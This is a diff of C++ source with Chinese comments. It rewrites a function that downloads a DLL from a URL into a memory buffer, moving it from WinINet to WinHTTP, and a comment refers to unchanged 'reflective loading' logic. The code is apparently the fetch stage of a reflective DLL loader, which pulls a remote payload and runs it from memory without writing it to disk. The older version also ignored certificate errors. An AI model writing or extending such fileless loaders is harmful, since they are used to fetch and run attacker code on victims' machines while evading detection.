@@ -2,9 +2,9 @@
 #include <iostream>
 #include <vector>
 #include <stdio.h>
-#include <wininet.h> // 必须包含网络库
+#include <winhttp.h>
 
-#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "winhttp.lib")
 
 // 移除对 g_dll.h 的依赖
 // #include "g_dll.h" 
@@ -14,65 +14,82 @@ typedef BOOL(WINAPI* f_DLL_ENTRY_POINT)(void*, DWORD, void*);
 
 // --- 工具函数：下载 DLL 到内存 ---
 bool DownloadToMemory(const std::string& url, std::vector<BYTE>& outBuffer) {
-    HINTERNET hInternet = NULL;
-    HINTERNET hUrl = NULL;
-    bool success = false;
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    URL_COMPONENTS urlComp = { 0 };
+    wchar_t szHostName[256], szUrlPath[1024];
+    bool bResults = false;
 
-    // 1. 使用 INTERNET_OPEN_TYPE_DIRECT 绕过可能的系统代理干扰
-    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return false;
+    // 1. 初始化 WinHTTP 句柄
+    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return false;
 
-    // 2. 强行设置超时限制，防止 12002 错误挂起
-    DWORD timeout = 10000; // 10秒足够了，如果10秒没响应说明链路有问题
-    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
-    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+    // 强制启用 TLS 1.2
+    DWORD dwProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwProtocols, sizeof(dwProtocols));
 
-    // 3. 移除可能导致冲突的 flag，只保留核心
-    DWORD flags = INTERNET_FLAG_RELOAD |
-        INTERNET_FLAG_RESYNCHRONIZE |
-        INTERNET_FLAG_SECURE |
-        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+    // 2. 解析 URL
+    urlComp.dwStructSize = sizeof(urlComp);
+    urlComp.lpszHostName = szHostName;
+    urlComp.dwHostNameLength = sizeof(szHostName) / sizeof(wchar_t);
+    urlComp.lpszUrlPath = szUrlPath;
+    urlComp.dwUrlPathLength = sizeof(szUrlPath) / sizeof(wchar_t);
 
-    hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, flags, 0);
+    std::wstring wUrl(url.begin(), url.end());
+    if (!WinHttpCrackUrl(wUrl.c_str(), 0, 0, &urlComp)) goto cleanup;
 
-    if (!hUrl) {
-        printf("[!] InternetOpenUrlA failed. LastError: %lu\n", GetLastError());
-        InternetCloseHandle(hInternet);
-        return false;
-    }
+    // 3. 连接到服务器
+    hConnect = WinHttpConnect(hSession, szHostName, urlComp.nPort, 0);
+    if (!hConnect) goto cleanup;
 
-    // 4. 检查 HTTP 状态码
-    DWORD statusCode = 0;
-    DWORD dwSize = sizeof(statusCode);
-    if (HttpQueryInfoA(hUrl, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &dwSize, NULL)) {
-        if (statusCode != 200) {
-            printf("[!] Server responded with HTTP %lu\n", statusCode);
-            InternetCloseHandle(hUrl);
-            InternetCloseHandle(hInternet);
-            return false;
+    // 4. 创建请求
+    hRequest = WinHttpOpenRequest(hConnect, L"GET", szUrlPath, NULL,
+        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
+
+    // 5. 发送请求并处理重定向
+    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+        if (WinHttpReceiveResponse(hRequest, NULL)) {
+
+            // 检查 HTTP 状态
+            DWORD dwStatusCode = 0;
+            DWORD dwSize = sizeof(dwStatusCode);
+            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
+
+            if (dwStatusCode != 200) {
+                printf("[!] WinHTTP Status Error: %lu\n", dwStatusCode);
+                goto cleanup;
+            }
+
+            // 6. 读取数据
+            DWORD dwDownloaded = 0;
+            outBuffer.clear();
+            do {
+                DWORD dwSizeToRead = 0;
+                if (!WinHttpQueryDataAvailable(hRequest, &dwSizeToRead)) break;
+                if (dwSizeToRead == 0) break;
+
+                std::vector<BYTE> temp(dwSizeToRead);
+                if (WinHttpReadData(hRequest, temp.data(), dwSizeToRead, &dwDownloaded)) {
+                    outBuffer.insert(outBuffer.end(), temp.begin(), temp.begin() + dwDownloaded);
+                }
+            } while (dwDownloaded > 0);
+
+            bResults = !outBuffer.empty();
         }
     }
-
-    // 5. 读取数据
-    const DWORD BUFFER_SIZE = 65536;
-    BYTE tempBuffer[BUFFER_SIZE];
-    DWORD bytesRead = 0;
-    outBuffer.clear();
-
-    printf("[+] Receiving data...");
-    while (InternetReadFile(hUrl, tempBuffer, BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
-        outBuffer.insert(outBuffer.end(), tempBuffer, tempBuffer + bytesRead);
-        // 实时反馈进度，防止你以为它卡死
-        printf(".");
+    else {
+        printf("[!] WinHttpSendRequest failed. Error Code: %lu\n", GetLastError());
     }
-    printf("\n");
 
-    success = !outBuffer.empty();
-
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
-    return success;
+cleanup:
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+    return bResults;
 }
 
 // --- 原有的反射式加载核心逻辑（保持不变） ---
